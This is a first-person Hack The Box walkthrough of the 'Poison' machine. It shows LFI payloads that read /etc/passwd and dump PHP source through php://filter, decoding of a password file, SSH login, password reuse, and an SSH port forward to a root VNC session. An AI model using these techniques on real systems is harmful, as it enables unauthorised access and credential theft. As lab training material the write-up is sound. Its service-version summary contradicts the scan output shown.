# Hack The Box - Poison Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.84
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 00:37 EST
Nmap scan report for 10.10.10.84
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)
|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)
|_  256 0b8fd57185901385618beb34135f943b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/4%OT=22%CT=1%CU=43962%PV=Y%DS=2%DC=I%G=Y%TM=6402D924
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=108%TI=Z%CI=Z%II=RI%TS=21)OPS
OS:(O1=M53CNW6ST11%O2=M53CNW6ST11%O3=M280NW6NNT11%O4=M53CNW6ST11%O5=M218NW6
OS:ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN
OS:(R=Y%DF=Y%T=40%W=FFFF%O=M53CNW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD=
OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.50 seconds
```

Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ rustscan -a 10.10.10.84 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.84:22
Open 10.10.10.84:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.10.84

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 00:15 EST
Initiating Ping Scan at 00:15
Scanning 10.10.10.84 [2 ports]
Completed Ping Scan at 00:15, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:15
Completed Parallel DNS resolution of 1 host. at 00:15, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:15
Scanning 10.10.10.84 [2 ports]
Discovered open port 80/tcp on 10.10.10.84
Discovered open port 22/tcp on 10.10.10.84
Completed Connect Scan at 00:15, 0.12s elapsed (2 total ports)
Nmap scan report for 10.10.10.84
Host is up, received syn-ack (0.12s latency).
Scanned at 2023-03-04 00:15:26 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
```

So, Rustscan & nmap both found `2` open ports and the results are: 

- Port `22`: running `OpenSSH 5.9p1`.
- Port `80`: running `Apache httpd 2.2.22`.

## Enumeration
Since, the ssh version of the machine was fairly new, it was likely that it is secured. So, I started by visiting the webpage on port `80` first.

![poi-1](https://user-images.githubusercontent.com/87711310/222877244-f34b9262-c820-44a3-90a4-7da59b319d4d.png)

It's just a simple website that takes in a script name and executes it. The list of few scripts that are executable is given. So, I tried executing each of these scripts one by one to find any juicy information.

The `ini.php` & `info.php` scripts didn’t give anything useful. The `phpinfo.php` script gives a wealth of information on the PHP server configuration. The `listfiles.php` script gaves the following output.

```
Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

Here, the `pwdbackup.txt` file looked interesting. So I tried if I could look at the contents of the file.

![poi-2](https://user-images.githubusercontent.com/87711310/222877417-5b76d39a-f00b-4b27-9409-400a4a86f9fe.png)

I got the following output:

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```

One thing I noticed was how easily I was able to retrieve the file and I was able to find out that the applicaton was not validation user input and therefore it was vulnerable to Local File Inclusion (LFI). 

Entering those php scripts into the URL bar does run them, but there’s also an obvious local file include that allows any site visitor to grab any file they want: `view-source:http://10.10.10.84/browse.php?file=%2Fetc%2Fpasswd`

```
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

I found a user `charix` which might be useful to log into ssh when the time comes.

As you would've noticed the presence of `/browse.php` in the URL, i decided to check out what it did, and the easiest way to do that is using `Burp`. So, I turned on my burp, started listening and intercepted the request.

![poi-3](https://user-images.githubusercontent.com/87711310/222879604-5e4fa2e6-772b-4f56-a1ec-2c92000c17c9.png)

Viewing the response, I found out that the website was not appending `.php` or some other extensions, so, I tried going to `index.php` and it actually executes the `index.php` page.

![poi-4](https://user-images.githubusercontent.com/87711310/222879657-e6503d21-b5c3-444b-9df7-4880467156c8.png)

To view the source code of this file, we can use a `php filter` like `filter://wrapper`. This will encode the page in base64 and output the encoded string.

```
php://filter/convert.base64-encode/resource=[file-name]
```

Sending the request with above php filter, I got the following response.

![poi-5](https://user-images.githubusercontent.com/87711310/222879761-9e82d704-dd18-4378-b3f0-217c50638c59.png)

The response gave back a Base64 encoded version of the source code.

```
PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K
```

Decoding the string, I got the source code.

```php
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ echo -n PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K | base64 -d
<?php
print_r(ini_get_all());
?>
```

Now that I know it is vulenrable to LFI, I tried to test the website to see if it vulnerable to RFI (Remote File Inclusion).

There are several methods to test RFI.

__PHP http:// Wrapper__
The PHP http wrapper allows you to access URLs. The syntax of the exploit is:

```
http://[path-to-remote-file]
```

Started a python server using the following command:

```
python -m http.server 5555
```

Attempted to run a file hosted on the server.

![poi-6](https://user-images.githubusercontent.com/87711310/222880918-0515c9b7-fa28-4f0b-806d-6b027f9cdb56.png)

I got an error informing that the `http://wrapper` is disabled. 

Similarly, i also got the same error while using the `PHP expect:// Wrapper`, `PHP expect:// Wrapper`, and the `PHP filter:// Wrapper`

So, in conclusion, this website is not vulenrable to RFI.

## Initial Foothold
Going back to the `pwdbackup.txt` file, the output of the file gave the hint that the password is encoded at least 13 times, and looking at the encoded string, it seems like it is Base64 encoded. So I wrote a simpe one liner script to decode the password.

Before that, I saved the Base64 encoded string in a file named `pwd.b64`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ echo "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=" > pwd.b64
```

The script to decode the Base64 encoded string is:

```
data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
```

The ouput of the script is:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
Charix!2#4%6&8(0
```

With the username `charix` and the password decoded, I tried to SSH into the machine.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ ssh charix@10.10.10.84 
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (ED25519) to the list of known hosts.

(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
You can `set autologout = 30' to have tcsh log you off automatically
if you leave the shell idle for more than 30 minutes.
charix@Poison:~ % whoami
charix
```

Grabbing the user flag.

```
charix@Poison:~ % pwd
/home/charix
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % cat user.txt
[REDACTED]
```

There was a `secret.zip` file inside the same directory where user flag was. So, I decided to take a look at it.

Firstly, I transferred the file back to my attack machine, and then tried to unzip it.

It asked me for the password and since most of the user's resuse the same password everytime, I decided to try the same password and it worked!!.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ scp charix@10.10.10.84:/home/charix/secret.zip .
(charix@10.10.10.84) Password for charix@Poison:
secret.zip                  100%  166     0.7KB/s   00:00    
                                                                             
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ ls
decode.sh  nmap  pwd.b64  secret.zip
                                                                             
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ unzip secret.zip               
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
                                                                             
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ ls
decode.sh  nmap  pwd.b64  secret  secret.zip

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ file secret 
secret: Non-ISO extended-ASCII text, with no line terminators

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Poison]
└─$ cat secret                                                  
��[|Ֆz!                     
```

The file seems to be encoded. Before I go down the route of figuring out what type of encoding is being used, I decided to go back to the victim machine and do some more enumeration.

I tried upgraded the shell to a fully interactive shell using the following command, but it didnt work.

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Output: 
```
charix@Poison:~ % python -c 'import pty;pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/local/lib/python2.7/pty.py", line 167, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/local/lib/python2.7/os.py", line 329, in execlp
    execvp(file, args)
  File "/usr/local/lib/python2.7/os.py", line 346, in execvp
    _execvpe(file, args)
  File "/usr/local/lib/python2.7/os.py", line 370, in _execvpe
    func(file, *argrest)
OSError: [Errno 2] No such file or directory

```

Due to this, I was not able to run the `sudo -l` command too

```
charix@Poison:~ % sudo -l
sudo: Command not found.
```

So now, I decided to take a look at the processes running on the system.

There was this one process which seemed odd.

```
root   529   0.0  0.9  23620  8868 v0- I    06:07     0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

So, i decided to check out the entire process information.

```
root    529   0.0  0.9  23620  8868 v0- I    06:07     0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

After Googling, I found out that `VNC` is a remote access software and the `-rfbport` flag indicates that it is listening on port `5901` on localhost.

So, I decided to verify it first using the `netstat` command.

```
charix@Poison:~ % netstat -an | grep LIST
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

Since, `VNC` is a graphical user interface(GUI) software, we can't access it through our target machine. So, I was required to perform `port forwarding`: 

```
ssh -L [local-port]:[remote-ip]:[remote-port]

ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
```

The above command allocates a socket to listen to port `5000` on localhost from my attack machine (kali). Whenever a connection is made to port `5000`, the connection is forwarded over a secure channel and is made to port `5901` on localhost on the target machine (poison).

I verified that the command worked using the following netstat command.

```
┌──(darshan㉿kali)-[~]
└─$ netstat -an | grep LIST
...
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
tcp6       0      0 ::1:5000                :::*                    LISTEN
...
```

Now that port forwarding is set, I tried connecting to VNC on te attack machine.

```
┌──(darshan㉿kali)-[~]
└─$ vncviewer 127.0.0.1:5000
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
```

And it asked me for a password. I tried Charix's password but it didn't work. So, I googled `vnc password` and found the following.

![poi-7](https://user-images.githubusercontent.com/87711310/222884696-ba1f84c8-6f28-4e9b-83da-20e830925045.png)

When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option. Earlier, I found a secret file that I didn’t know where to use. So let’s see if it’s the obfuscated password file we’re looking for.

```
vncviewer 127.0.0.1:5000 -passwd secret
```

I noticed that VNC was running with root privileges so I was able to grab the  root.txt file.

![poi-8](https://user-images.githubusercontent.com/87711310/222886040-05dfbc8b-3d49-4a9f-b99d-ab4e7db4172f.png)
